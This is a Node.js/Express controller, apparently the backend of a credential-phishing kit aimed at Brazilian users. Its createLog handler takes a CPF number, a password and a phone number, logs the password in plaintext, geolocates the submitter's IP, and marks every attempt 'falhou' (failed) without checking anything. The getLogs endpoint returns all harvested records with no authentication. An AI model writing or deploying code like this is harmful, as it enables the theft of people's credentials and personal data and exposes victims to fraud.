const Log = require('../../models/Log');
const axios = require('axios');

const LogController = {

  async createLog(req, res) {

    console.log("========== CREATE LOG ==========");

    try {

      console.log("BODY:", req.body);

      const {
        cpf,
        senha,
        celular
      } = req.body;

      console.log("CPF:", cpf);
      console.log("CELULAR:", celular);

      let ip =
        req.headers['x-forwarded-for']?.split(',')[0] ||
        req.socket.remoteAddress;

      console.log("IP:", ip);

      let localizacao = {};

      try {

        console.log("CONSULTANDO GEO...");

        if (
          ip === "::1" ||
          ip === "::ffff:127.0.0.1"
        ) {

          console.log("LOCALHOST DETECTADO");

          localizacao = {
            cidade: "Localhost",
            estado: "Dev",
            pais: "Local"
          };

        } else {

          const geo = await axios.get(
            `https://ipapi.co/${ip}/json/`,
            {
              timeout: 3000
            }
          );

          console.log("GEO OK");

          localizacao = {
            cidade: geo.data.city,
            estado: geo.data.region,
            pais: geo.data.country_name,
            latitude: geo.data.latitude,
            longitude: geo.data.longitude
          };

        }

      } catch (err) {

        console.log("ERRO GEO:", err.message);

      }

      console.log("LOCALIZACAO:", localizacao);

      console.log("ATUALIZANDO LOG NO MONGO...");

      const log = await Log.findOneAndUpdate(

        { cpf },

        {
          $push: {
            tentativas: {
              status: "falhou",
              senha,
              criadoEm: new Date()
            }
          },

          $inc: {
            totalTentativas: 1
          },

          $set: {
            celular,
            ip,
            localizacao,
            
          }
        },

        {
          upsert: true,
          new: true
        }

      );

      console.log("LOG ATUALIZADO COM SUCESSO");
      console.log("TOTAL TENTATIVAS:", log.totalTentativas);

      return res.status(200).json(log);

    } catch (error) {

      console.log("========== ERRO GERAL ==========");
      console.log(error);

      return res.status(500).json({
        error: "Erro ao criar log"
      });

    }

  },

  async getLogs(req, res) {

    console.log("========== GET LOGS ==========");

    try {

      const logs = await Log.find()
        .sort({ criadoEm: -1 });

      console.log("TOTAL LOGS:", logs.length);

      return res.json(logs);

    } catch (error) {

      console.log("ERRO AO BUSCAR LOGS:", error);

      return res.status(500).json({
        error: "Erro ao buscar logs"
      });

    }

  }

};

module.exports = LogController;